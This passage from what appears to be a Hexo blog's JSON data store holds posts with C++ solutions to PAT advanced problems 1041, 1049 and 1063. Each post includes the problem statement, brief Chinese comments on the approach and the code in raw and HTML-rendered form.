i++)\n\t{\n\t\tcin >> m[i];\n\t\tc[m[i]]++;\n\t}\n\tfor (int i = 0; i < n; i++)\n\t\tif (c[m[i]] == 1)\n\t\t{\n\t\t\tcout << m[i];\n\t\t\treturn 0;\n\t\t}\n\tcout << \"None\";\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1041.md","raw":"---\ntitle: PAT advanced 1041\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-18 09:57:21\n---\n\n## Description\n\n> 1041.Be Unique\n\n> Being unique is so important to people on Mars that even their lottery is designed in a unique way. The rule of winning is simple: one bets on a number chosen from [1, 104]. The first one who bets on a unique number wins. For example, if there are 7 people betting on 5 31 5 88 67 88 17, then the second one who bets on 31 wins.\n\n> Input Specification:\n\n> Each input file contains one test case. Each case contains a line which begins with a positive integer N (<=105) and then followed by N bets. The numbers are separated by a space.\n\n> Output Specification:\n\n> For each test case, print the winning number in a line. If there is no winner, print \"None\" instead.\n\n> Sample Input 1:\n7 5 31 5 88 67 88 17\nSample Output 1:\n31\n\n> Sample Input 2:\n5 888 666 666 888 888\nSample Output 2:\nNone\n\n不会啥好算法，空间换时间。。用一个数组记录每个数字出现的次数。\n\n## Code\n\n```\n#include <stack>\n#include<cstdio>  \n#include<string>  \n#include<cstring>  \n#include<vector>  \n#include<iostream>  \n#include<queue>  \n#include<algorithm>  \nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e5 + 10;\nconst int maxM = 1e4 + 10;\n\nint n, flag, k, ans = 0;\nint m[maxN];\nint c[maxM];\n\nint main()\n{\n\tcin >> n;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcin >> m[i];\n\t\tc[m[i]]++;\n\t}\n\tfor (int i = 0; i < n; i++)\n\t\tif (c[m[i]] == 1)\n\t\t{\n\t\t\tcout << m[i];\n\t\t\treturn 0;\n\t\t}\n\tcout << \"None\";\n\treturn 0;\n}\n```","slug":"PAT-advanced-1041","published":1,"updated":"2017-02-18T02:00:30.193Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k0b002bhv18dk2ucyyr","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1041.Be Unique</p>\n<p>Being unique is so important to people on Mars that even their lottery is designed in a unique way. The rule of winning is simple: one bets on a number chosen from [1, 104]. The first one who bets on a unique number wins. For example, if there are 7 people betting on 5 31 5 88 67 88 17, then the second one who bets on 31 wins.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. Each case contains a line which begins with a positive integer N (&lt;=105) and then followed by N bets. The numbers are separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each test case, print the winning number in a line. If there is no winner, print “None” instead.</p>\n<p>Sample Input 1:<br>7 5 31 5 88 67 88 17<br>Sample Output 1:<br>31</p>\n<p>Sample Input 2:<br>5 888 666 666 888 888<br>Sample Output 2:<br>None</p>\n</blockquote>\n<p>不会啥好算法，空间换时间。。用一个数组记录每个数字出现的次数。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stack&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstring&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span>  </span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e5</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxM = <span class=\"number\">1e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, flag, k, ans = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> m[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> c[maxM];</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; n;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">cin</span> &gt;&gt; m[i];</div><div class=\"line\">\t\tc[m[i]]++;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (c[m[i]] == <span class=\"number\">1</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; m[i];</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"None\"</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1041.Be Unique</p>\n<p>Being unique is so important to people on Mars that even their lottery is designed in a unique way. The rule of winning is simple: one bets on a number chosen from [1, 104]. The first one who bets on a unique number wins. For example, if there are 7 people betting on 5 31 5 88 67 88 17, then the second one who bets on 31 wins.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. Each case contains a line which begins with a positive integer N (&lt;=105) and then followed by N bets. The numbers are separated by a space.</p>\n<p>Output Specification:</p>\n<p>For each test case, print the winning number in a line. If there is no winner, print “None” instead.</p>\n<p>Sample Input 1:<br>7 5 31 5 88 67 88 17<br>Sample Output 1:<br>31</p>\n<p>Sample Input 2:<br>5 888 666 666 888 888<br>Sample Output 2:<br>None</p>\n</blockquote>\n<p>不会啥好算法，空间换时间。。用一个数组记录每个数字出现的次数。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stack&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstring&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;vector&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span>  </span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span>  </span></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e5</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxM = <span class=\"number\">1e4</span> + <span class=\"number\">10</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n, flag, k, ans = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> m[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> c[maxM];</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; n;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">cin</span> &gt;&gt; m[i];</div><div class=\"line\">\t\tc[m[i]]++;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (c[m[i]] == <span class=\"number\">1</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; m[i];</div><div class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"None\"</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1049","date":"2017-02-21T12:18:39.000Z","_content":"\n## Description\n\n> 1049.Counting Ones\n\n> The task is simple: given any positive integer N, you are supposed to count the total number of 1's in the decimal form of the integers from 1 to N. For example, given N being 12, there are five 1's in 1, 10, 11, and 12.\n\n> Input Specification:\n\n> Each input file contains one test case which gives the positive N (<=230).\n\n> Output Specification:\n\n> For each test case, print the number of 1's in one line.\n\n> Sample Input:\n12\n\n> Sample Output:\n5\n\n发现了别人的更好的解法(想法一样，实现比我好)，贴上来\n\n> 如果这位大于1，那么1的总数等于（左边的值+1）\\*（右边的位数）\n如果这位等于1，那么1的总数等于（左边的值）\\*（右边的位数）+右边的值\n如果这位等于0，那么1的总数等于（左边的值）\\*（右边的位数）\n\n## Code\n\n```\n#include<cstdio>\n#include<string>\n#include<cmath>\n#include<iostream>\n#include<algorithm>\n#include<limits>\n#include<queue>\n\nusing namespace std;\ntypedef long long LL;\n\nint n;\nint r, l, it;\nint ans = 0;\n\nint main()\n{\n\tcin >> n;\n\tint rr = 0;;\n\tfor (int i = 0, l = n / 10, r = 1; n; n /= 10, l /= 10, r *= 10)\n\t{\n\t\tint x = n % 10;\n\t\tif (x > 1)\n\t\t\tans += (l + 1) * r;\n\t\tif (x == 1)\n\t\t\tans += l * r + rr;\n\t\tif (x == 0)\n\t\t\tans += l * r;\n\t\trr += n % 10 * r;\n\t}\n\tprintf(\"%d\\n\", ans);\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1049.md","raw":"---\ntitle: PAT advanced 1049\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-21 20:18:39\n---\n\n## Description\n\n> 1049.Counting Ones\n\n> The task is simple: given any positive integer N, you are supposed to count the total number of 1's in the decimal form of the integers from 1 to N. For example, given N being 12, there are five 1's in 1, 10, 11, and 12.\n\n> Input Specification:\n\n> Each input file contains one test case which gives the positive N (<=230).\n\n> Output Specification:\n\n> For each test case, print the number of 1's in one line.\n\n> Sample Input:\n12\n\n> Sample Output:\n5\n\n发现了别人的更好的解法(想法一样，实现比我好)，贴上来\n\n> 如果这位大于1，那么1的总数等于（左边的值+1）\\*（右边的位数）\n如果这位等于1，那么1的总数等于（左边的值）\\*（右边的位数）+右边的值\n如果这位等于0，那么1的总数等于（左边的值）\\*（右边的位数）\n\n## Code\n\n```\n#include<cstdio>\n#include<string>\n#include<cmath>\n#include<iostream>\n#include<algorithm>\n#include<limits>\n#include<queue>\n\nusing namespace std;\ntypedef long long LL;\n\nint n;\nint r, l, it;\nint ans = 0;\n\nint main()\n{\n\tcin >> n;\n\tint rr = 0;;\n\tfor (int i = 0, l = n / 10, r = 1; n; n /= 10, l /= 10, r *= 10)\n\t{\n\t\tint x = n % 10;\n\t\tif (x > 1)\n\t\t\tans += (l + 1) * r;\n\t\tif (x == 1)\n\t\t\tans += l * r + rr;\n\t\tif (x == 0)\n\t\t\tans += l * r;\n\t\trr += n % 10 * r;\n\t}\n\tprintf(\"%d\\n\", ans);\n\treturn 0;\n}\n```","slug":"PAT-advanced-1049","published":1,"updated":"2017-02-21T12:23:04.229Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k0e002dhv18sra0r35m","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1049.Counting Ones</p>\n<p>The task is simple: given any positive integer N, you are supposed to count the total number of 1’s in the decimal form of the integers from 1 to N. For example, given N being 12, there are five 1’s in 1, 10, 11, and 12.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case which gives the positive N (&lt;=230).</p>\n<p>Output Specification:</p>\n<p>For each test case, print the number of 1’s in one line.</p>\n<p>Sample Input:<br>12</p>\n<p>Sample Output:<br>5</p>\n</blockquote>\n<p>发现了别人的更好的解法(想法一样，实现比我好)，贴上来</p>\n<blockquote>\n<p>如果这位大于1，那么1的总数等于（左边的值+1）*（右边的位数）<br>如果这位等于1，那么1的总数等于（左边的值）*（右边的位数）+右边的值<br>如果这位等于0，那么1的总数等于（左边的值）*（右边的位数）</p>\n</blockquote>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;limits&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> r, l, it;</div><div class=\"line\"><span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; n;</div><div class=\"line\">\t<span class=\"keyword\">int</span> rr = <span class=\"number\">0</span>;;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>, l = n / <span class=\"number\">10</span>, r = <span class=\"number\">1</span>; n; n /= <span class=\"number\">10</span>, l /= <span class=\"number\">10</span>, r *= <span class=\"number\">10</span>)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> x = n % <span class=\"number\">10</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (x &gt; <span class=\"number\">1</span>)</div><div class=\"line\">\t\t\tans += (l + <span class=\"number\">1</span>) * r;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (x == <span class=\"number\">1</span>)</div><div class=\"line\">\t\t\tans += l * r + rr;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (x == <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\tans += l * r;</div><div class=\"line\">\t\trr += n % <span class=\"number\">10</span> * r;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, ans);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1049.Counting Ones</p>\n<p>The task is simple: given any positive integer N, you are supposed to count the total number of 1’s in the decimal form of the integers from 1 to N. For example, given N being 12, there are five 1’s in 1, 10, 11, and 12.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case which gives the positive N (&lt;=230).</p>\n<p>Output Specification:</p>\n<p>For each test case, print the number of 1’s in one line.</p>\n<p>Sample Input:<br>12</p>\n<p>Sample Output:<br>5</p>\n</blockquote>\n<p>发现了别人的更好的解法(想法一样，实现比我好)，贴上来</p>\n<blockquote>\n<p>如果这位大于1，那么1的总数等于（左边的值+1）*（右边的位数）<br>如果这位等于1，那么1的总数等于（左边的值）*（右边的位数）+右边的值<br>如果这位等于0，那么1的总数等于（左边的值）*（右边的位数）</p>\n</blockquote>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;limits&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> n;</div><div class=\"line\"><span class=\"keyword\">int</span> r, l, it;</div><div class=\"line\"><span class=\"keyword\">int</span> ans = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; n;</div><div class=\"line\">\t<span class=\"keyword\">int</span> rr = <span class=\"number\">0</span>;;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>, l = n / <span class=\"number\">10</span>, r = <span class=\"number\">1</span>; n; n /= <span class=\"number\">10</span>, l /= <span class=\"number\">10</span>, r *= <span class=\"number\">10</span>)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> x = n % <span class=\"number\">10</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (x &gt; <span class=\"number\">1</span>)</div><div class=\"line\">\t\t\tans += (l + <span class=\"number\">1</span>) * r;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (x == <span class=\"number\">1</span>)</div><div class=\"line\">\t\t\tans += l * r + rr;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (x == <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\tans += l * r;</div><div class=\"line\">\t\trr += n % <span class=\"number\">10</span> * r;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, ans);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1063","date":"2017-02-18T10:32:49.000Z","_content":"\n## Description\n\n> 1063.Set Similarity\n\n>Given two sets of integers, the similarity of the sets is defined to be Nc/Nt\\*100%, where Nc is the number of distinct common numbers shared by the two sets, and Nt is the total number of distinct numbers in the two sets. Your job is to calculate the similarity of any given pair of sets.\n\n> Input Specification:\n\n> Each input file contains one test case. Each case first gives a positive integer N (<=50) which is the total number of sets. Then N lines follow, each gives a set with a positive M (<=104) and followed by M integers in the range [0, 109]. After the input of sets, a positive integer K (<=2000) is given, followed by K lines of queries. Each query gives a pair of set numbers (the sets are numbered from 1 to N). All the numbers in a line are separated by a space.\n\n> Output Specification:\n\n> For each query, print in one line the similarity of the sets, in the percentage form accurate up to 1 decimal place.\n\n> Sample Input:\n3\n3 99 87 101\n4 87 101 5 87\n7 99 101 18 5 135 18 99\n2\n1 2\n1 3\n\n> Sample Output:\n50.0%\n33.3%\n\n\n学习了几点简单的优化吧：\n+ `int`比`float`运算快\n+ `scnaf`和`printf`比`cin`和`cout`运算快\n+ 一段程序比多段程序运算快（是不是把编译时间算上去了？还是`call`是一个耗时的指令？）\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<set>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 5e1 + 10;\n\nset<int> s[maxN];\nint n, ni;\nint a, b;\nint x, o;\nint inN = 0;\nint allN = 0;\nfloat ans = 0;\nset<int> ::iterator it;\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tscanf(\"%d\", &ni);\n\t\twhile (ni--)\n\t\t{\n\t\t\tscanf(\"%d\", &x);\n\t\t\ts[i].insert(x);\n\t\t}\n\t}\n\tscanf(\"%d\", &o);\n\twhile (o--)\n\t{\n\t\tscanf(\"%d%d\", &a, &b);\n\t\tinN = 0; allN = 0; ans = 0;\n\t\tfor (it = s[a].begin(); it != s[a].end(); it++)\n\t\t\tif (s[b].find(*it) != s[b].end())inN++;\n\t\tallN = s[a].size() + s[b].size() - inN;\n\t\tans = (float)inN / allN;\n\t\tprintf(\"%.1f%%\\n\", ans * 100);\n\t}\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1063.md","raw":"---\ntitle: PAT advanced 1063\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-18 18:32:49\n---\n\n## Description\n\n> 1063.Set Similarity\n\n>Given two sets of integers, the similarity of the sets is defined to be Nc/Nt\\*100%, where Nc is the number of distinct common numbers shared by the two sets, and Nt is the total number of distinct numbers in the two sets. Your job is to calculate the similarity of any given pair of sets.\n\n> Input Specification:\n\n> Each input file contains one test case. Each case first gives a positive integer N (<=50) which is the total number of sets. Then N lines follow, each gives a set with a positive M (<=104) and followed by M integers in the range [0, 109]. After the input of sets, a positive integer K (<=2000) is given, followed by K lines of queries. Each query gives a pair of set numbers (the sets are numbered from 1 to N). All the numbers in a line are separated by a space.\n\n> Output Specification:\n\n> For each query, print in one line the similarity of the sets, in the percentage form accurate up to 1 decimal place.\n\n> Sample Input:\n3\n3 99 87 101\n4 87 101 5 87\n7 99 101 18 5 135 18 99\n2\n1 2\n1 3\n\n> Sample Output:\n50.0%\n33.3%\n\n\n学习了几点简单的优化吧：\n+ `int`比`float`运算快\n+ `scnaf`和`printf`比`cin`和`cout`运算快\n+ 一段程序比多段程序运算快（是不是把编译时间算上去了？还是`call`是一个耗时的指令？）\n\n## Code\n\n```\n#include<cstdio>\n#include<iostream>\n#include<set>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 5e1 + 10;\n\nset<int> s[maxN];\nint n, ni;\nint a, b;\nint x, o;\nint inN = 0;\nint allN = 0;\nfloat ans = 0;\nset<int> ::iterator it;\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tfor (int i = 1; i <= n; i++)\n\t{\n\t\tscanf(\"%d\", &ni);\n\t\twhile (ni--)\n\t\t{\n\t\t\tscanf(\"%d\", &x);\n\t\t\ts[i].insert(x);\n\t\t}\n\t}\n\tscanf(\"%d\", &o);\n\twhile (o--)\n\t{\n\t\tscanf(\"%d%d\", &a, &b);\n\t\tinN = 0; allN = 0; ans = 0;\n\t\tfor (it = s[a].begin(); it != s[a].end(); it++)\n\t\t\tif (s[b].find(*it) != s[b].end())inN++;\n\t\tallN = s[a].size() + s[b].size() - 